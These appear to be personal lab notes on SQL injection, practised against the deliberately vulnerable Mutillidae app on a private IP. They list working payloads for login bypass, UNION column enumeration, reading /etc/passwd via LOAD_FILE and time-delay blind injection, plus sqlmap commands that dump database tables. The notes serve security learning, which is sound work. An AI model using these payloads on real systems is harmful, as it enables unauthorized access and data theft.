Sql Injection:


Always give a single space after double hyphens
' OR 1=1 --
' OR '1'='1 --

' UNION SELECT NULL -- 
Here we don't know how many columns are there. So we are giving null value.
It will give the same error, Now add another null and try again.

' UNION SELECT NULL,NULL -- 
It will give the same error, Now add another null and try again.
SO we are adding as much as null values, at one stage you will get the results.

' UNION SELECT NULL,NULL,NULL,NULL,NULL -- 
So there are 5 columns, now we can replace null with numbers

' UNION SELECT 1,2,3,4,5 -- 
This will show the vulnerable columns with the number.
If still you didn't get the results then try adding more numbers.

Here the vulnerable columns are 

' UNION SELECT 1,user(),@@version,4,5 -- 
Here user() is the current user that is running in server backend.
@@version is the command to get the version details of db.

' UNION SELECT 1,LOAD_FILE("../../../../../etc/passwd"),3,4,5 -- 
Here LOAD_FILE() will print the contents of the file we mention
# Always give a single space after the double hyphens at the end.


' ORDER BY 1 -- 
Now the results will be sorted in ascending order corresponding to column 1.
If you get error then add +1.

' ORDER BY 2 -- 
Add +1 till you get an error.

' ORDER BY 6 --
Now we got the error, which means i has less than 6 columns.

' UNION SELECT null,'a',null -- 
Here the particular column is getting string as input, so we are giving 'a'.


Blind sql - Time Delay Injection
'; IF (1=2) WAITFOR DELAY '0:0:10' -- 
'; IF (1=1) WAITFOR DELAY '0:0:10' -- 
Try both the payloads and see the difference in the loading time.

MySQL - %3B(select sleep(10))-- -;   
Postgresql - %3B(select pg_sleep(10))-- -;


SQL MAP:
It is an automated sql injection tool.

# Choose the parameter you want to test for sqli and give * after the paramter value like this "username=admin*"

sqlmap -u "http://10.0.2.14/mutillidae/index.php?page=user-info.php&username=admin*&password=pass*&user-info-php-submit-button=View+Account+Details" --tables
THis will give us all the tables available in db.

sqlmap -u "http://10.0.2.14/mutillidae/index.php?page=user-info.php&username=admin*&password=pass*&user-info-php-submit-button=View+Account+Details" --dump
A database dump contains a record of the table structure and/or the data from a database.
